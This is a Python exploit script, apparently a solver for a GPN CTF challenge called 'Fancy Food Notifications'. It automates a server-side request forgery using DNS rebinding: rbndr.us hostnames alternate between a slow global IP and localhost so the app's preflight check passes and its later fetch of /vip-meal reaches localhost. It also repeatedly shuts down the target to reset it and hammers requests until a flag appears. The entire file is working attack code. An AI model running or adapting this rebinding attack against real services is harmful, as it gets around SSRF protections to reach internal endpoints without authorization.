#!/usr/bin/env python3
import argparse
import ipaddress
import random
import re
import socket
import sys
import time
from urllib.parse import urlparse

import requests
import urllib3

FLAG_RE = re.compile(r"GPNCTF\{[^}\s]+\}")
ID_RE = re.compile(r"/notification/([a-z0-9]{10})")

# Chosen to maximize the chance of a slow TCP/80 failure rather than a fast HTTP response.
DEFAULT_GLOBAL_IPS = [
    "11.255.255.254",
    "11.255.255.1",
    "20.20.20.20",
    "23.254.254.254",
    "30.30.30.30",
    "37.254.254.254",
    "43.43.43.43",
    "59.255.255.254",
    "101.255.255.254",
    "101.255.255.1",
    "123.123.123.123",
    "154.255.255.254",
    "188.255.255.254",
    "192.0.0.9",
    "192.0.0.10",
    "1.1.1.1",
]
DEFAULT_LOCAL_IPS = ["0.0.0.0", "127.0.0.1"]


def log(msg: str) -> None:
    print(msg, flush=True)


def ip_to_hex(ip: str) -> str:
    return socket.inet_aton(ip).hex()


def wait_until_up(base: str, session: requests.Session, timeout: int = 180) -> bool:
    end = time.time() + timeout
    last_err = None
    while time.time() < end:
        try:
            r = session.get(base + "/", timeout=8)
            body = r.text[:300]
            if r.status_code == 200 and ("Fancy Food Notifications" in body or "Welcome to Fancy Food Notifications" in body):
                return True
            last_err = f"HTTP {r.status_code} body={body!r}"
        except Exception as e:
            last_err = f"{type(e).__name__}: {e}"
        time.sleep(1)
    log(f"[!] wait_until_up last observation: {last_err}")
    return False


def reset_remote(base: str, session: requests.Session) -> bool:
    log("[*] resetting remote instance via /shutdown")
    try:
        session.get(base + "/shutdown", timeout=2)
    except Exception as e:
        log(f"    shutdown ended as expected: {type(e).__name__}: {e}")
    ok = wait_until_up(base, session, timeout=180)
    if ok:
        log("[+] instance is back")
    else:
        log("[!] instance did not come back in time")
    return ok


def post_order(base: str, session: requests.Session, ssrf_url: str):
    r = session.post(base + "/order", data={"url": ssrf_url, "meal": "Gulasch"}, timeout=15)
    m = ID_RE.search(r.text)
    return r, (m.group(1) if m else None)


def classify(status: str, msg: str, elapsed: float) -> str:
    one = msg.replace("\n", " ")
    if status == "REJECTED":
        return "preflight saw the local address; retry this candidate"
    if status == "FAILED":
        if elapsed >= 14:
            return "promising: connect phase likely stalled long enough to approach cache expiry; retry this exact candidate"
        return "failed too quickly; likely not a good slow global IP"
    if status == "DONE" and "You are not dressed appropriate" in one:
        return "self-SSRF hit /vip-meal through the external proxy, not localhost"
    if status == "DONE" and "VIP Meal" in one:
        return "success"
    return "unknown"


def poll_notification(base: str, session: requests.Session, nid: str, timeout: int = 180):
    end = time.time() + timeout
    i = 0
    last = None
    t0 = time.time()
    while time.time() < end:
        i += 1
        time.sleep(1)
        try:
            r = session.get(f"{base}/notification/{nid}", timeout=15)
            j = r.json()
        except Exception as e:
            log(f"[poll {i:02d}] read error: {type(e).__name__}: {e}")
            continue
        last = j
        status = j.get("status", "")
        msg = j.get("message", "")
        one = msg.replace("\n", " ")
        elapsed = time.time() - t0
        log(f"[poll {i:02d}] +{elapsed:5.1f}s status={status} message={one[:220]!r}")
        m = FLAG_RE.search(msg)
        if m:
            return m.group(0), j, elapsed
        if status in {"DONE", "FAILED", "REJECTED", "NO_ORDER"}:
            return None, j, elapsed
    return None, last, time.time() - t0


def make_rbndr_payload(global_ip: str, local_ip: str) -> str:
    return f"http://{ip_to_hex(global_ip)}.{ip_to_hex(local_ip)}.rbndr.us/vip-meal"


def run_attempt(base: str, session: requests.Session, payload: str, label: str, poll_timeout: int):
    log(f"[+] payload={payload}")
    started = time.time()
    try:
        r, nid = post_order(base, session, payload)
    except Exception as e:
        return {"error": f"POST /order failed: {type(e).__name__}: {e}"}
    out = {"post_status": r.status_code, "post_elapsed": time.time() - started, "label": label, "payload": payload}
    log(f"[+] POST /order HTTP {r.status_code}")
    if r.status_code == 429:
        out["error"] = "rate_limited"
        return out
    if not nid:
        out["error"] = "no_notification_id"
        out["body"] = r.text[:700]
        return out
    out["notification_id"] = nid
    log(f"[+] notification id: {nid}")
    flag, proof, elapsed = poll_notification(base, session, nid, timeout=poll_timeout)
    out["final_elapsed"] = elapsed
    out["proof"] = proof
    out["flag"] = flag
    return out


def build_candidates(global_ips, local_ips):
    items = []
    for gip in global_ips:
        if not ipaddress.ip_address(gip).is_global:
            raise SystemExit(f"{gip!r} is not global according to ipaddress")
        for lip in local_ips:
            items.append((gip, lip, make_rbndr_payload(gip, lip)))
    return items


def maybe_print_result(res):
    if res.get("error"):
        log(f"[-] {res['error']}")
        if res.get("body"):
            log(res["body"])
        return
    if res.get("flag"):
        proof = res.get("proof") or {}
        msg = proof.get("message", "")
        log("\n[+] FLAG FOUND: " + res["flag"])
        if proof.get("status") == "DONE" and "VIP Meal" in msg and "vip customers" in msg:
            log("[+] proof: /notification status=DONE contains the /vip-meal HTML and the flag.")
        else:
            log("[!] warning: regex matched a flag but VIP proof markers were not both present.")
        return
    proof = res.get("proof") or {}
    status = proof.get("status", "")
    msg = proof.get("message", "")
    elapsed = res.get("final_elapsed", 0.0)
    log("[-] no flag in this attempt")
    log(f"    final status={status} elapsed={elapsed:.1f}s")
    log(f"    final message={msg.replace(chr(10), ' ')[:500]!r}")
    log(f"    hint: {classify(status, msg, elapsed)}")


def main() -> int:
    ap = argparse.ArgumentParser(description="Search for a slow-first rbndr candidate, then hammer it until it flips to localhost on retry.")
    ap.add_argument("base")
    ap.add_argument("--attempts", type=int, default=40, help="maximum attempts in hammer mode")
    ap.add_argument("--poll-timeout", type=int, default=180)
    ap.add_argument("--no-verify", action="store_true")
    ap.add_argument("--global-ip", action="append", dest="global_ips")
    ap.add_argument("--local-ip", action="append", dest="local_ips")
    ap.add_argument("--pick", help="pin one global IP immediately and skip probing")
    ap.add_argument("--shuffle", action="store_true")
    ap.add_argument("--probe-rounds", type=int, default=1, help="how many probe passes over the candidate list")
    ap.add_argument("--slow-threshold", type=float, default=14.0, help="FAILED after at least this many seconds counts as promising")
    args = ap.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    session = requests.Session()
    session.verify = not args.no_verify
    base = args.base.rstrip("/")

    global_ips = args.global_ips or list(DEFAULT_GLOBAL_IPS)
    local_ips = args.local_ips or list(DEFAULT_LOCAL_IPS)

    log(f"[+] target: {base}")
    if not wait_until_up(base, session, timeout=60):
        log("[-] target did not respond with expected index page at startup")
        return 2

    candidates = build_candidates(global_ips, local_ips)
    if args.shuffle:
        random.shuffle(candidates)

    chosen = None
    if args.pick:
        chosen = [c for c in candidates if c[0] == args.pick]
        if not chosen:
            log(f"[-] no candidate for {args.pick}")
            return 2
        chosen = chosen[0]
    else:
        log(f"[+] probing {len(candidates)} rbndr candidates")
        for round_no in range(1, args.probe_rounds + 1):
            for idx, (gip, lip, payload) in enumerate(candidates, 1):
                label = f"probe {idx}/{len(candidates)}: {gip} -> {lip}"
                log(f"\n[{label}]")
                res = run_attempt(base, session, payload, label, args.poll_timeout)
                maybe_print_result(res)
                if res.get("flag"):
                    return 0
                proof = res.get("proof") or {}
                status = proof.get("status", "")
                elapsed = res.get("final_elapsed", 0.0)
                if status == "FAILED" and elapsed >= args.slow_threshold:
                    chosen = (gip, lip, payload)
                    log(f"[+] selected promising candidate: {gip} -> {lip}")
                    break
                reset_remote(base, session)
            if chosen:
                break
        if not chosen:
            # best-effort fallback to the first candidate, because sometimes success is just luck.
            chosen = candidates[0]
            log(f"[!] no obviously slow candidate found; falling back to {chosen[0]} -> {chosen[1]}")

    gip, lip, payload = chosen
    log(f"\n[+] hammering candidate {gip} -> {lip}")
    for i in range(1, args.attempts + 1):
        label = f"hammer {i}/{args.attempts}: {gip} -> {lip}"
        log(f"\n[{label}]")
        res = run_attempt(base, session, payload, label, args.poll_timeout)
        maybe_print_result(res)
        if res.get("flag"):
            return 0
        reset_remote(base, session)

    log("[-] exhausted attempts without a verified flag")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
